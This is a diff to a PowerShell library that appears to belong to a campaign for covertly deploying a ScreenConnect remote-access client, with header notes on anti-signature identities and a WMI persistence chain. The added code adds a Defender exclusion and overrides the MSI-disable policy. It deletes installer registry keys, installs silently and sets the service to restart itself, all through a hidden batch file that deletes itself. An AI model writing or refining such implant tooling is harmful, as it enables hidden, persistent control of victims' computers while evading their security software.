@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L34
+# OWN_LIB  BUILD 20260802L35
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L34: purge phantom Installer ProductCode registration (Installed=00:00:00, no ARP key) that survives /x and forces maintenance-mode 1603. L33: /x preclean.
+# L35: preclean moved INSIDE detached wrapper so ensure returns instantly (10s Run-tool cap was killing ensure before spawn). L34: phantom-reg purge.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -582,30 +582,32 @@ function Remove-InstallerProductRegistration([string]$ProductCode) {
 
 function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     Add-ScDefenderExclusion $Fp
-    # L33: the new gryxa MSI can share a ProductCode with a prior FP's install (cross-FP
-    # ProductCode collision). If that ProductCode is already registered, msiexec /i drops
-    # into maintenance mode and fails 1603. Uninstall the ProductCode first so /i is a
-    # clean INSTALL. /x on an unregistered code is a cheap no-op (1605), so always try it.
+    # L34/L35: do the ProductCode preclean INSIDE the detached wrapper so the ensure returns
+    # instantly (hosts with a ~10s Run-tool cap were killing the ensure before the install
+    # spawned). The wrapper: enable MSI -> /x the colliding ProductCode -> purge phantom
+    # Installer registration (packed GUID) -> /i clean install -> configure+start service.
     $pc = Get-MsiProperty $MsiPath 'ProductCode'
-    if ($pc) {
-        & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
-        Start-Process msiexec.exe -ArgumentList "/x $pc /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden
-        Start-Sleep -Seconds 5
-        # L34: phantom registration (Installed=00:00:00, no ARP key) survives /x and still
-        # forces maintenance-mode 1603. Purge it from the Installer database so /i is a
-        # true first-time INSTALL.
-        Remove-InstallerProductRegistration $pc
-    }
+    $packed = ''
+    if ($pc) { $packed = ConvertTo-PackedGuid $pc }
     $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
-    $lines = @(
-        '@echo off',
-        "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`"",
-        "sc config `"ScreenConnect Client ($Fp)`" start= auto",
-        "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000",
-        "sc start `"ScreenConnect Client ($Fp)`"",
-        "del /f /q `"$cmd`" >nul 2>&1",
-        'exit'
-    )
+    $lines = @('@echo off')
+    $lines += 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1'
+    if ($pc) {
+        $lines += "msiexec /x $pc /qn /norestart REBOOT=ReallySuppress >nul 2>&1"
+        if ($packed) {
+            $lines += "reg delete `"HKCR\Installer\Products\$packed`" /f >nul 2>&1"
+            $lines += "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\$packed`" /f >nul 2>&1"
+            $lines += "reg delete `"HKLM\SOFTWARE\Classes\Installer\Products\$packed`" /f >nul 2>&1"
+        }
+        $lines += "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
+        $lines += "reg delete `"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\$pc`" /f >nul 2>&1"
+    }
+    $lines += "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`""
+    $lines += "sc config `"ScreenConnect Client ($Fp)`" start= auto"
+    $lines += "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000"
+    $lines += "sc start `"ScreenConnect Client ($Fp)`""
+    $lines += "del /f /q `"$cmd`" >nul 2>&1"
+    $lines += 'exit'
     Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
     Start-Process cmd.exe -ArgumentList "/c `"$cmd`"" -WindowStyle Hidden
 }
